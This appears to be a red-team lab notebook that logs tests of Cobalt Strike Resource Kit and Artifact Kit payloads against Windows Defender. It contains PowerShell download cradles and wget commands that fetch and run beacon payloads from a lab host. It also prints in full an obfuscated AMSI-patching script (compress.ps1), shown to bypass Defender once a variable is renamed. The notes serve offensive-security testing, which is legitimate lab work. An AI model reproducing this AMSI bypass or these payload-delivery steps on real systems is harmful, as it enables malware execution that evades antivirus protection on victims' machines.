### Resource kit & Artifact kit testing ( Defender ON - Should not Bypass Defender)
starting `arsenal-kit-mod.py` with `AV Bypass Disabled`
![[Pasted image 20250408212216.png]]
making sure  defender is on
![[Pasted image 20250408212644.png]]
started up cobalt strike
![[Pasted image 20250408213103.png]]
starting up listener
![[Pasted image 20250408213140.png]]
generating payloads in `/home/kali/malware`
![[Pasted image 20250408213231.png]]
testing `resource kit` first
![[Pasted image 20250408213319.png]]
using this payload to attempt to execute `iex(iwr http://192.168.127.129/a -useb)` - got caught
![[Pasted image 20250408213416.png]]
turning off `defender` to make sure that the beacon does work.
![[Pasted image 20250408213453.png]]
now was able to catch the beacon with  defender off so it does indeed work properly
![[Pasted image 20250408215302.png]]
![[Pasted image 20250408215317.png]]
now going to test artifact kit - reverting `guardian VM` making sure defender is on

![[Pasted image 20250408220738.png]]
hosting file on cobalt strike at `/test`
![[Pasted image 20250408220821.png]]
going to place on desktop to see if it gets eaten - which it should
```bash
wget http://192.168.127.129:80/test -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe" 
```
defender caught it
![[Pasted image 20250408220953.png]]
and it ate it
![[Pasted image 20250408221003.png]]
now turning off defender to see if the beacon still works.
![[Pasted image 20250408221029.png]]
worked to pull over
![[Pasted image 20250408221048.png]]
now  double clicking to see if we get the beacon
![[Pasted image 20250408221113.png]]

-------

### Resource kit & Artifact kit testing ( Defender ON - Should Bypass Defender)

reverted guardian, making sure defender is on
![[Pasted image 20250408221827.png]]
clearing cobalt strike data
![[Pasted image 20250408222127.png]]
running `arsenal-kit-mod.py` with option `2` to `enable AV Bypass`
![[Pasted image 20250408222340.png]]
starting up cobalt strike server
![[Pasted image 20250408222708.png]]generating listener and `http payloads`
![[Pasted image 20250408222842.png]]![[Pasted image 20250408222905.png]]
attempting `resource kit` bypass , this should not get caught `iex(iwr http://192.168.127.129/a -useb)` again defender is on
![[Pasted image 20250408223206.png]]
this did get caught lets try reloading the `aggressor script`
![[Pasted image 20250408223241.png]]
reloaded
![[Pasted image 20250408223300.png]]still got caught
![[Pasted image 20250408223324.png]]
lets check to make sure the `compress.ps1` was properly changed
![[Pasted image 20250408223423.png]]
looks correct to me, lets look at what the no shit version looks like

`compress.ps1` from [[7. compress.ps1 - resource kit - OPTEV-RT Modification]]
the `sha256sum` matches the one with issues, lets try copying the `4.10` working version and rerun the script
![[Pasted image 20250408223604.png]]
tried copying and pasting this but the `sha256sum` is different, still going to try it
Saving a VM screenshot and pulling `compress.ps1` from the `Before moving the tested 4.11 cobaltstrike to /opt/cobaltstrike` screenshot and saving to my `SSD` `e4f60766bc71fefacc039f45c7f60a3eba5b3d4a00fdd241b5626c908aee9747  compress.ps1`
pulled over the `compress.ps1` with my `SSD` and going to test
![[Pasted image 20250409160841.png]]
put the previously working `compress.ps1` in the `resource_kit_bypass` directory
![[Pasted image 20250409161110.png]]
shutting down `cobaltstrike` and going to rebuild using `arsenal-kit-mod.py` with the new `compress.ps1` files
![[Pasted image 20250409161401.png]]
rerunning the `script`
![[Pasted image 20250409161554.png]]
starting up the `cobaltstrike` server again
![[Pasted image 20250409161426.png]]
starting `listener` and `web hosted delivery` at `/a`
![[Pasted image 20250409161659.png]]
making sure `defender` is on
![[Pasted image 20250409161832.png]]
`iex(iwr http://192.168.127.129/a -useb)` payload to use
- it got caught,
![[Pasted image 20250409161908.png]]
going to `unload` and`reload` the cobaltstrike script
![[Pasted image 20250409162045.png]]
and `restart cobalt strike server` and `restart the listener `and `rehost the file`
still got caught
![[Pasted image 20250409162258.png]]
changing the `thegreatest` variable to `hellogoodbye` allowed it to bypass `defender`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[09Apr2025 21:14:42]-[/opt/â€¦/kits/artifact/artifact-kit-AV-switcher/resource_kit_bypass]
â””â”€# cat compress.ps1                  
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$hellogoodbye=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($hellogoodbye,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
sha256sum
```
â”Œâ”€â”€(rootðŸ’€gobots)-[09Apr2025 21:14:46]-[/opt/â€¦/kits/artifact/artifact-kit-AV-switcher/resource_kit_bypass]
â””â”€# sha256sum compress.ps1
860510593614cdeb568fd82706c5db4ea7b5c46fb3c1973256fe4dbeaa32205c  compress.ps1
```
`resourcekit` works good to bypass defender, here we can see `defender is on` and the beacon is running
![[Pasted image 20250409180733.png]]proof beacon is running
![[Pasted image 20250409180753.png]]
#### Now testing the artifact kit bypass

hosting file at `/artifact`
![[Pasted image 20250409180937.png]]
`wget http://192.168.127.129:80/artifact -UseBasicP -OutFile "C:\Users\blaster\Desktop\artifacttest.exe"` to pull over file

was able to pull over to `desktop`
![[Pasted image 20250409181335.png]]
lets see if we can execute it by double clicking

![[Pasted image 20250409181358.png]]
able to catch beacon and it didnt get caught by defender
![[Pasted image 20250409181420.png]]